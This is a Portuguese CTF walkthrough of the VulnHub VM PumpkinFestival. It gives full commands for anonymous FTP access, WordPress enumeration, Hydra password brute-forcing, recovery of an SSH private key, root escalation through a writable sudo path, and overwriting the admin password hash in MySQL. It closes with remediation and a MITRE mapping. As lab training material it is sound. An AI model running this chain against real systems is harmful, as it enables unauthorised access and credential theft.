# VulnHub Mission Pumpkin v1.0 (3/3): PumpkinFestival — Walkthrough

( ^◡^) Então pessoal!! Chegou o tão esperado Festival da Abóbora!

Esta é a terceira e última parte da série Mission Pumpkin v1.0, criada pelo Jayanth. Esta VM é a mais completa das três: FTP anônimo, WordPress com enumeração de usuários, descoberta de virtual host, SSH com autenticação por chave pública, uma cadeia de arquivos aninhados que vai testar sua paciência, e no final uma escalação de privilégios via sudo tão simples que você vai dar risada. Dez tokens espalhados por toda parte. A máquina que te humilha antes de te entregar o root.

Muito obrigado ao Jayanth por fechar a trilogia com esta obra. Cada etapa referencia conhecimentos das VMs anteriores e acrescenta novos desafios criativos.

---

| Campo | Valor |
|-------|-------|
| **Nível** | Iniciante |
| **VM Alvo** | Mission-Pumpkin v1.0: PumpkinFestival |
| **VM Atacante** | Kali Linux 2019.2 |
| **VulnHub** | https://www.vulnhub.com/entry/mission-pumpkin-v10-pumpkinfestival,330/ |
| **Técnicas** | Host discovery, Nmap, FTP anônimo, análise de código-fonte web, descoberta de virtual host (/etc/hosts), enumeração WordPress (WPScan/Gobuster), decodificação Base62 (CyberChef), brute-force FTP/SSH (Hydra), autenticação SSH por chave pública, extração de arquivo aninhado (TAR/file magic), decode hex para chave SSH privada, acesso ao banco de dados WordPress via MySQL, execução arbitrária via sudo, escalação de privilégios |
| **CVEs** | N/A (desafio de lógica, configuração e credenciais) |

> **Dicas do autor:**
> "Chegue ao root e acesse o PumpkinFestival_Ticket, coletando PumpkinTokens no caminho."
> "Alohomora!" (referência a Harry Potter; e literalmente uma dica para a escalação de privilégios)

---

## Resumo do Ataque

```
[host-discovery: IP exibido no banner da VM ao inicializar]
    |
    v
[nmap: FTP/21, HTTP/80, SSH/6880 — robots.txt expõe diretórios]
    |
    v
[FTP anônimo -> secret/token.txt -> Token 1]
    |
    v
[HTTP: texto oculto em index.html -> Token 2; usuários: harry, jack]
    |
    v
[/store/track.txt -> admin@pumpkins.local -> adiciona pumpkins.local ao /etc/hosts]
    |
    v
[pumpkins.local -> WordPress -> Token 3]
    |
    v
[dirsearch -> /tokens/token.txt -> Token 4]
    |
    v
[WPScan: usuários admin+morse; /license.txt -> Token 5; /readme.html -> Base62 -> credenciais]
    |
    v
[Login WordPress como morse -> Token 6 no perfil]
    |
    v
[SSH na porta 6880: somente chave pública; Hydra FTP -> harry:yrrah]
    |
    v
[FTP como harry -> Token 7 + cadeia Donotopen -> Token 8 + arquivos aninhados -> id_rsa (chave SSH)]
    |
    v
[Corrige permissões da chave -> SSH como jack na porta 6880]
    |
    v
[Binário SUID /home/jack/token -> Token 9]
    |
    v
[sudo -l: pode executar alohomora como root -> cria /home/jack/pumpkins/alohomora -> shell root]
    |
    v
[/root/PumpkinFestival_Ticket + rascunho WordPress do admin -> Token 10]
```

---

## Metodologia

1. Host discovery pelo banner da VM
2. Varredura completa com Nmap: FTP, HTTP, SSH na porta não-padrão 6880
3. Acesso FTP anônimo para o primeiro token
4. Análise de código-fonte web e descoberta de virtual host
5. Enumeração WordPress com WPScan e Gobuster
6. Decodificação Base62 para credenciais (CyberChef)
7. Brute-force FTP para obter credenciais do harry; extração de chave SSH de arquivo aninhado
8. Acesso SSH na porta 6880 com chave privada extraída
9. Escalação de privilégios via configuração incorreta do sudo (execução de caminho arbitrário)
10. Acesso ao banco de dados WordPress para o token final

---

## Passo 1 — Identificando o Alvo

Igual às VMs anteriores desta série: o IP aparece direto no banner de inicialização:

```
This machine is up and running at
192.168.10.102
```

Sem necessidade de arp-scan. Partiu para a enumeração.

> **MITRE ATT&CK:** [TA0043 Reconhecimento] [T1595.001 Varredura Ativa: Scanning de IPs]

---

## Passo 2 — Reconhecimento e Enumeração de Serviços

```bash
nmap -A -T4 -p- 192.168.10.102
```

Output esperado:

```
21/tcp   open  ftp     vsftpd 2.0.8 or later
80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu))
6880/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13
```

Três serviços. FTP na 21, HTTP na 80 e SSH na porta não-padrão 6880. O Nmap já lê o `robots.txt` e expõe vários diretórios: `secret` (FTP) e caminhos web incluindo `/store`, `/img`, `/js`, `/seeds`.

SSH numa porta alta é um sinal clássico de CTF para "autenticação por senha provavelmente está desabilitada, você vai precisar de uma chave." Vamos confirmar isso mais pra frente.

> **MITRE ATT&CK:** [TA0043 Reconhecimento] [T1595.002 Varredura Ativa] [T1046 Descoberta de Serviços de Rede]

---

## Passo 3 — FTP Anônimo (Token 1)

O Nmap já nos disse que o FTP aceita acesso anônimo. Primeiro token, sem cerimônia:

```bash
ftp 192.168.10.102 21
# Login: anonymous
# Senha: anonymous (ou apenas Enter)
```

Dentro do FTP:

```
ftp> ls
ftp> cd secret
ftp> get token.txt
ftp> bye
```

Lê o arquivo:

```bash
cat token.txt
```

**Token 1:** `PumpkinToken : 2d6dbbae84d724409606eddd9dd71265`

Wow guys!! Já começamos bem. ( ͡° ͜ʖ ͡°)

> **Nota do mundo real:** FTP anônimo é um dos problemas mais frequentemente sinalizados em avaliações de rede. O botnet Mirai (2016) se propagou em parte via credenciais padrão em dispositivos embarcados; compartilhamentos FTP anônimos são um equivalente estrutural. Referência: US-CERT TA16-288A.

> **MITRE ATT&CK:** [TA0001 Acesso Inicial] [T1078 Contas Válidas] [T1133 Serviços Remotos Externos]

---

## Passo 4 — Análise Web (Tokens 2 e 3)

Abre `http://192.168.10.102/` no browser. Tem uma mensagem de boas-vindas com uma referência a Harry Potter: "Alohomora!" (o feitiço de desbloqueio — isso é uma dica que reaparece na escalação de privilégios).

Analisa o código-fonte:

```bash
curl -s "http://192.168.10.102/" | grep -v "^$"
```

Há texto oculto no fonte que não fica visível na renderização normal do browser. Procura com atenção.

**Token 2:** `PumpkinToken : 45d9ee7239bc6b0bb21d3f8e1c5faa52`

Também no código, dois possíveis nomes de usuários aparecem nos comentários e no conteúdo:

- `harry`
- `jack`

Salva:

```bash
echo -e "harry\njack" > usuarios.txt
```

O Nmap expôs vários diretórios do `robots.txt`. Tenta `/store/track.txt`:

```bash
curl -s "http://192.168.10.102/store/track.txt"
```

Esse arquivo tem um código de rastreamento E um endereço de e-mail: `admin@pumpkins.local`. Esse domínio é crucial.

Muitos servidores web usam virtual hosting: o mesmo IP serve conteúdo completamente diferente dependendo do cabeçalho `Host:` enviado pelo cliente. Sem saber o domínio, você só vê o site padrão. Adiciona ao `/etc/hosts`:

```bash
echo "192.168.10.102  pumpkins.local" | sudo tee -a /etc/hosts
```

Navega para `http://pumpkins.local/`. Um site WordPress aparece.

**Token 3:** `PumpkinToken : 06c3eb12ef2389e2752335beccfb2080` (visível na homepage do WordPress)

> **MITRE ATT&CK:** [TA0007 Descoberta] [T1083 Descoberta de Arquivos e Diretórios]

---

## Passo 5 — Enumeração de Diretórios e Caça aos Tokens

Roda o dirsearch contra o IP para encontrar mais caminhos:

```bash
dirsearch -u http://192.168.10.102 -x 403,404,500 -e php,html,txt,jpg,gif,png,zip,tar,gz,gpg
# Você também pode usar gobuster ou feroxbuster
```

Ou com gobuster:

```bash
gobuster dir -u http://192.168.10.102/ -x php,html,txt \
    -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

O caminho `/tokens/token.txt` aparece.

```bash
curl -s "http://192.168.10.102/tokens/token.txt"
```

**Token 4:** `PumpkinToken : 2c0e11d2200e2604587c331f02a7ebea`

> **MITRE ATT&CK:** [TA0007 Descoberta] [T1083 Descoberta de Arquivos e Diretórios]

---

## Passo 6 — Enumeração WordPress (Tokens 5 e 6, mais credenciais)

Roda o WPScan contra o WordPress para enumerar plugins, temas, vulnerabilidades e usuários:

```bash
wpscan --url http://pumpkins.local/ --enumerate at,ap,u
```

Isso revela:

- 14 vulnerabilidades conhecidas para esta versão do WordPress
- Dois usuários: `admin` e `morse`

Agora verifica os arquivos WordPress. Começa com `/license.txt`:

```bash
curl -s "http://pumpkins.local/license.txt"
```

**Token 5:** `PumpkinToken : 5ff346114d634a015ce413e1bc3d8d71`

Agora o `/readme.html`:

```bash
curl -s "http://pumpkins.local/readme.html"
```

O arquivo contém uma string codificada. NÃO é Base64 (primeira tentativa óbvia). Parece Base62. Usa o CyberChef em https://gchq.github.io/CyberChef/ e testa "From Base62" na seção Data Format.

> **O que é Base62?** Base62 codifica dados usando 62 caracteres: 0-9, A-Z, a-z. É usado frequentemente em encurtadores de URL e geração de tokens porque evita caracteres especiais. Menos comum que Base64, o que o torna uma escolha razoável de ofuscação em CTFs.

Resultado decodificado:

```
morse:Ug0t!TrIpyJ
jack:Ug0t!TrIpyJ
```

Ambos os usuários compartilham a mesma senha. O usuário WordPress é `morse`, e `jack` é para SSH ou FTP.

Faz login no WordPress em `http://pumpkins.local/wp-login.php` com `morse:Ug0t!TrIpyJ`.

Navega para o perfil do usuário:

**Token 6:** `PumpkinToken : 7139e925fd43618653e51f820bc6201b`

Há também um rascunho do `admin` intitulado "PumpkinToken" que não conseguimos ler como `morse`. Voltaremos para o Token 10 depois.

> **MITRE ATT&CK:** [TA0006 Acesso a Credenciais] [T1552.001 Credenciais não Seguras: Credenciais em Arquivos]

---

## Passo 7 — Análise do SSH (Porta 6880)

Tenta o login com as credenciais do jack:

```bash
ssh jack@pumpkins.local -p 6880
# Permission denied (publickey)
```

O SSH exige autenticação por chave pública. O brute-force confirma:

```bash
nmap -sV -p6880 --script ssh-auth-methods.nse pumpkins.local
# Resultado: somente publickey
```

Precisamos da chave privada do jack. Isso significa que temos que encontrá-la em outro lugar primeiro.

> **MITRE ATT&CK:** [TA0001 Acesso Inicial] [T1021.004 Serviços Remotos: SSH]

---

## Passo 8 — Brute-Force FTP (credenciais do harry + Chave SSH)

Como o SSH está bloqueado, atacamos o FTP com os usuários que encontramos:

```bash
hydra -e nsr -L usuarios.txt -P /usr/share/wordlists/rockyou.txt \
    pumpkins.local ftp -I -F
```

Em segundos:

```
[21][ftp] host: pumpkins.local   login: harry   password: yrrah
```

**harry:yrrah** — a senha é literalmente "harry" ao contrário. Clássico. ¯\_(ツ)_/¯

Faz o login:

```bash
ftp pumpkins.local 21
# Login: harry / Senha: yrrah
```

Navega e coleta tokens:

```bash
ftp> get token.txt
```

**Token 7:** `PumpkinToken : ba9fa9abf2be9373b7cbd9a6457f374e`

Tem também um diretório chamado `Donotopen`. Óbvio que a gente abre. ԅ(≖‿≖ԅ)

```bash
ftp> cd Donotopen/NO/NOO/NOOO/NOOOO/
ftp> get token.txt
```

**Token 8:** `PumpkinToken : f9c5053d01e0dfc30066476ab0f0564c`

Continua. Dentro de `NOOOOO/NOOOOOO/` tem um arquivo chamado `data.txt`. Baixa e verifica o que realmente é:

```bash
ftp> cd NOOOOO/NOOOOOO
ftp> get data.txt
ftp> bye

file data.txt
# data.txt: POSIX tar archive
```

A extensão é falsa — clássico CTF para te enganar. É um TAR. Extrai e repete:

```bash
mv data.txt data.tar
tar xf data.tar
file *  # repete este processo até chegar ao arquivo final
```

Você vai passar por várias camadas de extração. ლ(ಠ_ಠლ) No final você chega a um arquivo chamado `jack`. Verifica:

```bash
file jack
# jack: ASCII text, with very long lines

cat jack | xxd -r -p
# Output: um bloco PEM de chave privada RSA
```

Extrai a chave para o local correto:

```bash
cat jack | xxd -r -p > /root/.ssh/id_rsa
```

> **MITRE ATT&CK:** [TA0006 Acesso a Credenciais] [T1552.004 Credenciais não Seguras: Chaves Privadas]

---

## Passo 9 — Acesso SSH como Jack (Porta 6880)

Tenta usar a chave:

```bash
ssh jack@pumpkins.local -p 6880
# WARNING: UNPROTECTED PRIVATE KEY FILE!
# Permissions are too open.
```

O SSH recusa a chave por causa das permissões do arquivo. Corrige:

```bash
chmod 600 /root/.ssh/id_rsa
```

Mas há outro problema: a chave pertence ao usuário `jack`, mas estamos rodando como `root`. O SSH valida que o dono da chave corresponde ao usuário que está se conectando. Cria um usuário local `jack` e transfere a propriedade:

```bash
useradd --no-create-home --no-user-group --shell=/bin/false jack
chown jack /root/.ssh/id_rsa
```

Agora tenta de novo:

```bash
ssh jack@pumpkins.local -p 6880
```

Estamos dentro como jack! ᕕ( ᐛ )ᕗ

```bash
# Para deletar o usuário local jack criado na máquina atacante:
userdel --remove --force jack
```

> **MITRE ATT&CK:** [TA0001 Acesso Inicial] [T1550.004 Uso de Material de Autenticação Alternativo: Chaves SSH]

---

## Passo 10 — Escalação de Privilégios via Sudo

Lista o diretório atual e verifica binários SUID:

```bash
ls -la /home/jack/
# Um binário SUID chamado 'token' existe
./token
```

**Token 9:** `PumpkinToken : 8d66ef0055b43d80c34917ec6c75f706`

Agora verifica as permissões sudo:

```bash
sudo -l
```

Output esperado:

```
User jack may run the following commands on PumpkinFestival:
    (root) NOPASSWD: /home/jack/pumpkins/alohomora
```

Ixi! O jack pode executar `/home/jack/pumpkins/alohomora` como root sem senha. Mas o arquivo e o diretório não existem. A gente cria:

```bash
mkdir /home/jack/pumpkins
echo "/bin/sh -i" > /home/jack/pumpkins/alohomora
chmod +x ~/pumpkins/alohomora
sudo ~/pumpkins/alohomora
```

Shell de root. (☞ﾟヮﾟ)☞

```bash
whoami
# root

id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/PumpkinFestival_Ticket
```

**Flag final (PumpkinFestival_Ticket) capturada!!**

Maravilha pessoal!! Foi mais fácil escalar do que chegar até aqui, concordam?? huahuahua

> **Por que isso funciona?** A política sudo permite ao jack executar um caminho específico como root. Como o jack é dono do diretório home e o caminho não existe ainda, o jack pode criar tanto o diretório quanto o executável. A entrada sudo verificou o caminho, não o conteúdo do arquivo. Este é um exemplo claro de por que políticas sudo nunca devem permitir execução de caminhos controlados pelo usuário.

> **MITRE ATT&CK:** [TA0004 Escalação de Privilégios] [T1548.003 Abuso de Mecanismo de Elevação: Sudo]

---

## Passo 11 — Token Final: Rascunho do Admin no WordPress (Token 10)

O banner do `PumpkinFestival_Ticket` confirma que há 10 tokens no total. Temos 9. O que falta é o rascunho de postagem do WordPress visível apenas para o `admin`.

### Método 1: Wordlist Customizada + WPScan

Gera uma wordlist baseada no site:

```bash
cewl http://192.168.10.102/ -w wordlistPumpkin.txt
```

Enriquece cruzando com a rockyou.txt:

```bash
for i in $(cat wordlistPumpkin.txt); do
    grep "$i" /usr/share/wordlists/rockyou.txt | grep -x '.\\{4,15\\}' >> wordlistPumpkin.txt
    sort -u wordlistPumpkin.txt -o wordlistPumpkin.txt
done
# Cresce de ~36 para ~322.693 entradas
```

Ataca o login do WordPress:

```bash
wpscan -U admin -P wordlistPumpkin.txt --url http://pumpkins.local/
```

A senha do admin é a saudação da página inicial.

### Método 2: Atualização Direta no MySQL (mais rápido via shell)

Com acesso root, encontra a configuração do WordPress:

```bash
cat /etc/apache2/sites-available/web.conf
# Revela o diretório do WordPress

cat /home/web/wp-config.php
# Credenciais do banco: root:root
```

Acessa o MySQL:

```bash
mysql -uroot -p
# Senha: root

show databases;
use pumpkins;
show tables;
select user_login,user_pass from wp_users;

# Copia o hash de senha do morse e seta para o admin:
update wp_users
set user_pass = '$P$BCvOKficMcCyBtPxjoiM8S8SFBfWUj1'
where user_login = 'admin';
```

Faz login no WordPress como `admin` com a senha do `morse`. Abre o rascunho.

**Token 10:** `PumpkinToken : f2e00edc353309b40e1aed18e18ab2c4`

Todos os 10 tokens coletados! GG rapaziada! ᕕ( ᐛ )ᕗ

---

## Flags, Hashes e Credenciais Capturadas

| # | Tipo | Valor | Encontrado Em | Observação |
|---|------|-------|---------------|-----------|
| T1 | PumpkinToken | `2d6dbbae84d724409606eddd9dd71265` | FTP: secret/token.txt | FTP anônimo |
| T2 | PumpkinToken | `45d9ee7239bc6b0bb21d3f8e1c5faa52` | HTTP: index.html (texto oculto) | |
| T3 | PumpkinToken | `06c3eb12ef2389e2752335beccfb2080` | WordPress homepage (pumpkins.local) | vhost necessário |
| T4 | PumpkinToken | `2c0e11d2200e2604587c331f02a7ebea` | HTTP: /tokens/token.txt | dirsearch |
| T5 | PumpkinToken | `5ff346114d634a015ce413e1bc3d8d71` | WordPress: /license.txt | |
| T6 | PumpkinToken | `7139e925fd43618653e51f820bc6201b` | WordPress: perfil do usuário morse | |
| T7 | PumpkinToken | `ba9fa9abf2be9373b7cbd9a6457f374e` | FTP: /home/harry/token.txt | brute-force FTP |
| T8 | PumpkinToken | `f9c5053d01e0dfc30066476ab0f0564c` | FTP: Donotopen/NO/NOO/NOOO/NOOOO/token.txt | |
| T9 | PumpkinToken | `8d66ef0055b43d80c34917ec6c75f706` | SSH: /home/jack/token (binário SUID) | |
| T10 | PumpkinToken | `f2e00edc353309b40e1aed18e18ab2c4` | WordPress: rascunho do admin | MySQL ou CeWL |
| Credencial | morse:Ug0t!TrIpyJ | decode Base62 de /readme.html | WordPress |
| Credencial | jack:Ug0t!TrIpyJ | decode Base62 de /readme.html | SSH (chave, não senha) |
| Credencial | harry:yrrah | brute-force FTP (rockyou) | acesso FTP |
| Chave SSH | RSA Privada | FTP: cadeia Donotopen -> data.txt -> decode hex | chave do jack para porta 6880 |
| Credencial DB | root:root | /home/web/wp-config.php | MySQL |

---

## Lições Aprendidas

| # | Achado | Relevância no Mundo Real | Lição Principal |
|---|--------|-------------------------|----------------|
| 1 | FTP anônimo com arquivos sensíveis | Comum em redes corporativas legadas; compartilhamentos FTP costumam conter arquivos de configuração, backups ou credenciais | Desabilitar FTP anônimo; enforçar autenticação; auditar compartilhamentos expostos regularmente |
| 2 | Virtual host expõe aplicação oculta (WordPress) | Enumeração de subdomínio e vhost é um passo padrão de reconhecimento; apps internas muitas vezes carecem do hardening das públicas | Inventariar todos os vhosts e domínios; aplicar controles de segurança consistentes independente da visibilidade |
| 3 | Política sudo permite execução de caminho controlado pelo usuário | Provavelmente a configuração incorreta de sudo mais perigosa; encontrada em achados reais de escalação de privilégios | Caminhos no sudo devem apontar para executáveis fixos de propriedade do root; nunca permitir execução de diretórios controlados pelo usuário |
| 4 | Credenciais em texto puro no wp-config.php | Exposição do wp-config.php é um achado frequente em avaliações WordPress; credenciais de banco de dados no web root são risco crítico | Configs com credenciais devem ficar fora do web root; permissões de arquivo devem restringir a leitura ao processo do servidor web |
| 5 | Senha derivada do username invertido (harry/yrrah) | Padrões baseados em transformações do próprio username são facilmente capturados por regras de mangling em brute-force | Enforçar políticas de senha que proíbam padrões derivados do nome de usuário |

**Por que isso importa fora do laboratório?**

A configuração incorreta do sudo neste desafio espelha achados reais reportados por equipes DFIR em investigações pós-exploração de Linux corporativo. Quando um atacante obtém um shell limitado, a primeira coisa que executa é `sudo -l`. Se o output incluir qualquer caminho onde o usuário tenha acesso de escrita, acabou. O CIS Benchmark para Linux (Seção 5.3) aborda isso explicitamente. A exposição do `wp-config.php` está documentada nos principais riscos de segurança de aplicações da OWASP e aparece em uma parcela significativa das avaliações de segurança WordPress. Combinados, esses dois achados representam um caminho realista de movimento lateral da web até o root em muitos ambientes de produção.

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | TTP-ID |
|------|--------|---------|--------|
| Reconhecimento | TA0043 | Varredura Ativa: Scanning de Vulnerabilidades | T1595.002 |
| Descoberta | TA0007 | Descoberta de Serviços de Rede | T1046 |
| Descoberta | TA0007 | Descoberta de Arquivos e Diretórios | T1083 |
| Acesso Inicial | TA0001 | Contas Válidas (FTP Anônimo) | T1078 |
| Acesso Inicial | TA0001 | Serviços Remotos Externos | T1133 |
| Acesso a Credenciais | TA0006 | Credenciais não Seguras: Credenciais em Arquivos | T1552.001 |
| Acesso a Credenciais | TA0006 | Credenciais não Seguras: Chaves Privadas | T1552.004 |
| Acesso a Credenciais | TA0006 | Força Bruta: Password Spraying | T1110.003 |
| Movimento Lateral | TA0008 | Serviços Remotos: SSH | T1021.004 |
| Movimento Lateral | TA0008 | Uso de Material de Autenticação Alternativo: Chaves SSH | T1550.004 |
| Escalação de Privilégios | TA0004 | Abuso de Mecanismo de Elevação: Sudo | T1548.003 |
| Coleta | TA0009 | Dados do Sistema Local | T1005 |
| Execução | TA0002 | Interpretador de Comando e Script: Unix Shell | T1059.004 |

> MITRE ATT&CK: https://attack.mitre.org/

---

## Remediação e Contenção

### Correções Técnicas

1. Desabilitar FTP anônimo imediatamente; se FTP for necessário, enforçar acesso autenticado com credenciais fortes e logging de auditoria
2. Auditar todas as configurações de virtual host e aplicar controles de segurança consistentes em todos os vhosts
3. Corrigir a política sudo para remover qualquer entrada que permita execução de caminhos controlados pelo usuário; usar apenas executáveis absolutos de propriedade do root
4. Mover o `wp-config.php` para fora do web root, ou restringir suas permissões de leitura ao processo do servidor web
5. Enforçar políticas de senha que proíbam padrões derivados do nome de usuário (harry/yrrah, admin/nimda, etc.)
6. Enforçar rotação de chaves para todas as chaves SSH privadas encontradas em armazenamento compartilhado (FTP, SMB)

### Se Você Encontrar Isso no Seu Ambiente

**Contenção imediata:**
- Desabilitar FTP anônimo, rotacionar todas as credenciais FTP
- Auditar `/etc/sudoers` e `/etc/sudoers.d/` para qualquer caminho onde usuário não-root tenha acesso de escrita
- Remover ou restringir acesso ao `wp-config.php` e rotacionar todas as credenciais do banco de dados
- Invalidar todas as chaves SSH expostas via FTP ou armazenamento compartilhado

**Contramedidas MITRE D3FEND:**
- D3-MFA (Autenticação Multifator) para todos os serviços de acesso remoto
- D3-CTS (Escopo de Transmissão de Credenciais) para credenciais de banco de dados; nunca expô-las em arquivos acessíveis pela web
- D3-SJA (Análise de Jobs Agendados) e revisão periódica da política sudo como parte do ciclo de hardening
- D3-DA (Análise Dinâmica) para detectar execução de arquivos recém-criados em diretórios home de usuários via sudo

### Alinhamento com Frameworks

**NIST CSF 2.0:**
- Identificar (ID.AM): Inventariar todos os serviços, incluindo servidores FTP e aplicações web internas em vhosts não-padrão
- Proteger (PR.AC-4): Gestão de acesso privilegiado; enforçar menor privilégio no sudo e desabilitar serviços sem autenticação
- Detectar (DE.CM-3): Monitorar logs de acesso FTP e eventos de autenticação SSH para padrões anômalos
- Responder (RS.MI-2): Rotacionar todas as credenciais potencialmente expostas após qualquer comprometimento confirmado
- Recuperar (RC.RP-1): Restaurar a partir de backups verificados; reconstruir stacks de aplicações web comprometidas com configurações endurecidas

**NIST SP 800-53 (Rev. 5):**
- AC-6: Menor Privilégio — restringir entradas sudo ao mínimo absoluto
- AC-17: Acesso Remoto — desabilitar protocolos de acesso remoto sem autenticação (FTP anônimo)
- IA-5: Gestão de Autenticadores — proibir senhas derivadas do nome de usuário e padrões reversos
- SC-28: Proteção de Informações em Repouso — proteger arquivos de configuração com credenciais de leitura não autorizada

**CISA Known Exploited Vulnerabilities:**
- Sem correspondência direta de CVE para este desafio específico
- Referência: https://www.cisa.gov/known-exploited-vulnerabilities-catalog

**C2M2:**
- Domínio: ACCESS
- Prática: Gestão de Identidade e Acesso — auditar todos os métodos de autenticação entre os serviços; enforçar ciclo de vida de gestão de chaves
- MIL alvo: MIL-2

---

## Considerações Finais

Muito obrigado ao Jayanth por fechar esta trilogia com uma máquina que recompensa paciência. A cadeia de arquivos aninhados no FTP é o tipo de obstáculo que faz você querer desistir exatamente antes de encontrar a chave SSH dentro. E depois a escalação de privilégios é elegante na sua simplicidade: a complexidade estava toda na entrada, não na escalação.

Fora do laboratório: o PumpkinFestival ensina uma verdade que todo pentester internaliza cedo. A parte mais difícil de um engajamento real muitas vezes não é a exploração em si. É o reconhecimento: encontrar o vhost, ler o robots.txt, notar que `/store/track.txt` tem um endereço de e-mail, reconhecer uma string Base62 vs Base64. A configuração incorreta do sudo que nos deu root aqui leva cerca de 30 segundos para explorar depois de descoberta. Encontrar as condições para isso pode levar horas.

A habilidade que esta máquina desenvolve não são as mecânicas de exploração. É o hábito de reconhecimento minucioso e metódico onde nada é pequeno demais para inspecionar.

Se este guia te ajudou a coletar todos os 10 tokens, compartilhe com a galera e continue hackeando!

*Thanks guys!! (❍ᴥ❍ʋ)*

> Artigo original em português de André Henrique: https://medium.com/@mrhenrike

---

*Writeup por [André Henrique](https://medium.com/@mrhenrike) | [União Geek](https://uniaogeek.com.br)*
